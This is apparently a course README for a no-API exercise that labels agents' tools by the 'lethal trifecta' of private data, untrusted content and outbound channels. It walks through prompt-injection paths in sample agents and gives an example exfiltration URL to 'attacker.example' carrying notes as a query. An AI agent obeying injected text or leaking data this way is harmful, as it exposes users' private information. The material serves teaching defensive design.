# Lethal trifecta

Demo 3's attack needed three things at once: Sam's private data, a device name somebody else wrote, and a tool that sends an email to any address. Simon Willison calls that combination the **lethal trifecta**. Here you'll check six agents for it, from this module, from Module 7 and from everyday products, by labelling each tool with what it gives the agent. Then you'll add an agent of your own, and argue with the labels. No model and no API key.

From the module folder (`day-two/module-08-security-and-deployment`):

```bash
uv run python playground/lethal-trifecta/play.py
```

Or without `uv` (set up `.venv` once at the repo root with `python3 -m venv .venv && .venv/bin/pip install -e .`):

```bash
source ../../.venv/bin/activate
python playground/lethal-trifecta/play.py
```

Needs nothing. The report goes in `playground/lethal-trifecta/output/report.json`.

---

Each tool lists the legs of the trifecta it gives the agent. `confirmed` means a person approves every call:

```python
"Ask Dormouse, demo 4": {
    "get_my_home": {"legs": ["private", "untrusted"]},
    "contact_support": {"legs": []},
    "invite_member": {"legs": ["outbound"], "confirmed": True},
},
```

The check finds which tools give which leg. If a leg is missing, the attack has nothing to steal or nowhere to send it. If all three are there, it names the tools that are the only source of a leg, because taking one of those away breaks the trifecta:

```text
Ask Dormouse, demo 3
  private data:            get_my_home
  untrusted content:       get_my_home
  a way to send data out:  invite_member
  At risk: all three. An injection can read private data and send it out. Taking away get_my_home or invite_member would break it.

Ask Dormouse, demo 4
  ...
  All three, but a person confirms every way out. As safe as the person reading the question.

Priya's assistant, demo 6
  private data:            search_docs, get_customer
  untrusted content:       get_customer
  a way to send data out:  -
  Safe from this attack: no way to send data out.

Module 7's coding agent
  private data:            read_file
  untrusted content:       read_file
  a way to send data out:  run_tests
  At risk: all three. ... Taking away read_file or run_tests would break it.

An email assistant
  ...
  At risk: all three. ... Taking away read_inbox or send_email would break it.

A research agent
  private data:            read_notes
  untrusted content:       fetch_page
  a way to send data out:  fetch_page
  At risk: all three. ... Taking away fetch_page or read_notes would break it.
```

## Things to notice

- **One tool can give two legs.** `get_my_home` is both private data and untrusted content, because the home record includes names that other people wrote. You can't see that from the tool's name.
- **Fetching a web page is a way out.** The research agent's `fetch_page` brings in untrusted text, and the address it fetches can carry data out: `https://attacker.example/?notes=...`. A read-only tool isn't always read-only.
- **The coding agent from Module 7 is at risk.** It reads files anyone could have committed, and it runs code it wrote, which can reach the internet. That's why coding agents ask before running commands, and why some run in a sandbox with no network.
- **"Taking away" is the blunt answer.** The agent usually needs all its tools. The other answers are a person confirming the way out (demo 4), or separating the agents: one reads untrusted text, a different one holds the private data.
- **Demo 4's verdict is only as good as the person.** In demo 4 the assistant, still believing the injected name, asked Sam to accept the invitation.

## Try this

1. **Add an agent you use.** Claude Code, Cursor, a ChatGPT project with connectors, your company's support bot. Label each tool honestly. Which are at risk?
2. **Argue with a label.** Is `contact_support` really harmless, if support staff can be talked into things? Is a ticket a customer wrote untrusted when Priya's assistant reads it? Change the labels and see what changes.
3. **Add Meta's third property.** The Agents Rule of Two counts "can change state" as well as "can communicate outside". Add a `changes` leg (writing files, sending a replacement) and a rule-of-two check: no more than two of untrusted, private and changes-or-outbound.
4. **Suggest a split.** When an agent is at risk, print a design that splits it into two agents, one with the untrusted leg and one with the private leg. Does the split still do the job?
5. **Check real tool lists.** Read the tools from an MCP server (Module 5's search server, or demo 6's), label them, and check them. Could a server describe its own legs?

## Questions

For discussion. There are no right answers.

- Every useful assistant seems to want all three legs. Is the trifecta a rule, or a warning?
- Who should label the tools: the developer who wrote them, a security reviewer, or the vendor of the MCP server?
- Demo 4's confirmation makes the check say "as safe as the person". How would you measure how safe that is?
- Priya's assistant has no way out today. What feature request would quietly add one?

## Further reading

- **Simon Willison, "The lethal trifecta for AI agents: private data, untrusted content, and external communication"**, 16 June 2025: https://simonwillison.net/2025/Jun/16/the-lethal-trifecta/. The whole post is short; it's where the name comes from.
- **Meta AI, "Agents Rule of Two: A Practical Approach to AI Agent Security"**, October 2025: https://ai.meta.com/blog/practical-ai-agent-security/. Read how it adds changing state as a third risky property.

## Rabbit holes

- **Design patterns.** Beurer-Kellner et al. (2025), "Design Patterns for Securing LLM Agents against Prompt Injections" (https://arxiv.org/abs/2506.08837), sets out six ways to build agents that injections can't steer, such as plan-then-execute and the dual LLM. Pick one and rebuild Ask Dormouse with it, then run demo 3's attack against it.
- **CaMeL.** Debenedetti et al. (2025), "Defeating Prompt Injections by Design" (https://arxiv.org/abs/2503.18813), has one model write a plan as code and tracks where every value came from, so data from an untrusted source can't flow to a dangerous tool. Read Section 5, and write the policy that would have stopped the invitation.
